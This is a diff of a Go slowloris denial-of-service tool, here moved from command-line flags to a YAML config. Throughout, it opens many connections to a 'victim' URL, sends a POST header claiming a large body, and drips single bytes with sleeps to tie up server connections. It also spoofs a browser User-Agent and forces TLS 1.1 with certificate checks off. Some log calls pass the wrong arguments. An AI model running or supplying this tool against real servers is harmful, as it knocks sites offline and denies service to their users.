@@ -8,7 +8,9 @@ import (
 	"crypto/tls"
 	"flag"
 	"fmt"
+	"gopkg.in/yaml.v2"
 	"io"
+	"io/ioutil"
 	"log"
 	"net"
 	"net/url"
@@ -17,37 +19,50 @@ import (
 	"time"
 )
 
-var (
-	contentLength    = flag.Int("contentLength", 1000*1000, "The maximum length of fake POST body in bytes. Adjust to nginx's client_max_body_size")
-	dialWorkersCount = flag.Int("dialWorkersCount", 10, "The number of workers simultaneously busy with opening new TCP connections")
-	goMaxProcs       = flag.Int("goMaxProcs", runtime.NumCPU(), "The maximum number of CPUs to use. Don't touch :)")
-	rampUpInterval   = flag.Duration("rampUpInterval", time.Second, "Interval between new connections' acquisitions for a single dial worker (see dialWorkersCount)")
-	sleepInterval    = flag.Duration("sleepInterval", 10*time.Second, "Sleep interval between subsequent packets sending. Adjust to nginx's client_body_timeout")
-	testDuration     = flag.Duration("testDuration", time.Hour, "Test duration")
-	victimUrl        = flag.String("victimUrl", "http://127.0.0.1/", "Victim's url. Http POST must be allowed in nginx config for this url")
-	hostHeader       = flag.String("hostHeader", "", "Host header value in case it is different than the hostname in victimUrl")
-)
+type Configuration struct {
+	URL              string `yaml:"URL"`
+	DialWorkersCount int    `yaml:"dial_count_workers"`
+	TestDuration     string `yaml:"test_duration"`
+	SleepInterval    string `yaml:"sleep_interval"`
+}
 
 var (
+	Config        Configuration
+	SleepInterval time.Duration
+	TestDuration  time.Duration
+	pathConfig    string
+
 	sharedReadBuf  = make([]byte, 4096)
 	sharedWriteBuf = []byte("A")
 
-	tlsConfig = &tls.Config{
-		InsecureSkipVerify: true,
-	}
+	hostname string
 )
 
-func main() {
+func init() {
+	flag.StringVar(&pathConfig, "c", "conf.yml", "Configuration file for proxy-auth module")
 	flag.Parse()
-	flag.VisitAll(func(f *flag.Flag) {
-		fmt.Printf("%s=%v\n", f.Name, f.Value)
-	})
+}
 
-	runtime.GOMAXPROCS(*goMaxProcs)
-
-	victimUri, err := url.Parse(*victimUrl)
+func main() {
+	runtime.GOMAXPROCS(runtime.NumCPU())
+	var err error
+	if err = LoadConfig(); err != nil {
+		log.Fatalf("Error loading configuration file:", err.Error())
+	}
+	if SleepInterval, err = time.ParseDuration(Config.SleepInterval); err != nil {
+		log.Fatalf("Cannot parse sleep_interval=[%s]: [%s]\n", Config.SleepInterval, err)
+	}
+	if TestDuration, err = time.ParseDuration(Config.TestDuration); err != nil {
+		log.Fatalf("Cannot parse test_duration=[%s]: [%s]\n", Config.TestDuration, err)
+	}
+	log.Printf("Starting...\n")
+	log.Printf("URL: %v\n", Config.URL)
+	log.Printf("Count workers: %v\n", Config.DialWorkersCount)
+	log.Printf("Sleep interval: %v\n", SleepInterval)
+	log.Printf("Test duration: %v\n", TestDuration)
+	victimUri, err := url.Parse(Config.URL)
 	if err != nil {
-		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", victimUrl, err)
+		log.Fatalf("Cannot parse victimUrl=[%s]: [%s]\n", time.Second, err)
 	}
 	victimHostPort := victimUri.Host
 	if !strings.Contains(victimHostPort, ":") {
@@ -57,30 +72,26 @@ func main() {
 		}
 		victimHostPort = net.JoinHostPort(victimHostPort, port)
 	}
+	hostname = victimUri.Host
 	host := victimUri.Host
-	if len(*hostHeader) > 0 {
-		host = *hostHeader
-	}
-	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Type: application/x-www-form-urlencoded\nContent-Length: %d\n\n",
-		victimUri.RequestURI(), host, *contentLength))
+	requestHeader := []byte(fmt.Sprintf("POST %s HTTP/1.1\nHost: %s\nContent-Length: 64000\nContent-Type: application/x-www-form-urlencoded\nUser-Agent:Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7\n\n",
+		victimUri.RequestURI(), host))
 
-	dialWorkersLaunchInterval := *rampUpInterval / time.Duration(*dialWorkersCount)
-	activeConnectionsCh := make(chan int, *dialWorkersCount)
+	activeConnectionsCh := make(chan int, Config.DialWorkersCount)
 	go activeConnectionsCounter(activeConnectionsCh)
-	for i := 0; i < *dialWorkersCount; i++ {
+	for i := 0; i < Config.DialWorkersCount; i++ {
 		go dialWorker(activeConnectionsCh, victimHostPort, victimUri, requestHeader)
-		time.Sleep(dialWorkersLaunchInterval)
 	}
-	time.Sleep(*testDuration)
+	time.Sleep(time.Duration(TestDuration))
 }
 
 func dialWorker(activeConnectionsCh chan<- int, victimHostPort string, victimUri *url.URL, requestHeader []byte) {
 	isTls := (victimUri.Scheme == "https")
+
 	for {
-		time.Sleep(*rampUpInterval)
 		conn := dialVictim(victimHostPort, isTls)
 		if conn != nil {
-			go doLoris(conn, victimUri, activeConnectionsCh, requestHeader)
+			go doLoris(conn, activeConnectionsCh, requestHeader)
 		}
 	}
 }
@@ -114,8 +125,13 @@ func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	if !isTls {
 		return tcpConn
 	}
-
-	tlsConn := tls.Client(conn, tlsConfig)
+	tlsConn := tls.Client(conn, &tls.Config{
+		PreferServerCipherSuites: true,
+		InsecureSkipVerify:       true,
+		MinVersion:               tls.VersionTLS11,
+		MaxVersion:               tls.VersionTLS11,
+		ServerName:               hostname,
+	})
 	if err = tlsConn.Handshake(); err != nil {
 		conn.Close()
 		log.Printf("Couldn't establish tls connection to [%s]: [%s]\n", hostPort, err)
@@ -124,7 +140,7 @@ func dialVictim(hostPort string, isTls bool) io.ReadWriteCloser {
 	return tlsConn
 }
 
-func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh chan<- int, requestHeader []byte) {
+func doLoris(conn io.ReadWriteCloser, activeConnectionsCh chan<- int, requestHeader []byte) {
 	defer conn.Close()
 
 	if _, err := conn.Write(requestHeader); err != nil {
@@ -138,14 +154,15 @@ func doLoris(conn io.ReadWriteCloser, victimUri *url.URL, activeConnectionsCh ch
 	readerStopCh := make(chan int, 1)
 	go nullReader(conn, readerStopCh)
 
-	for i := 0; i < *contentLength; i++ {
+	for i := 0; i < 4096; i++ {
 		select {
 		case <-readerStopCh:
 			return
-		case <-time.After(*sleepInterval):
+		default:
+			time.Sleep(SleepInterval)
 		}
 		if _, err := conn.Write(sharedWriteBuf); err != nil {
-			log.Printf("Error when writing %d byte out of %d bytes: [%s]\n", i, *contentLength, err)
+			log.Printf("Error when writing %d byte out of %d bytes: [%s]\n", i, 4096, err)
 			return
 		}
 	}
@@ -159,4 +176,16 @@ func nullReader(conn io.Reader, ch chan<- int) {
 	} else {
 		log.Printf("Unexpected response read from server: [%s]\n", sharedReadBuf[:n])
 	}
+}
+
+func LoadConfig() error {
+	bytes, err := ioutil.ReadFile(pathConfig)
+	if err != nil {
+		return err
+	}
+	err = yaml.Unmarshal(bytes, &Config)
+	if err != nil {
+		return err
+	}
+	return nil
 }
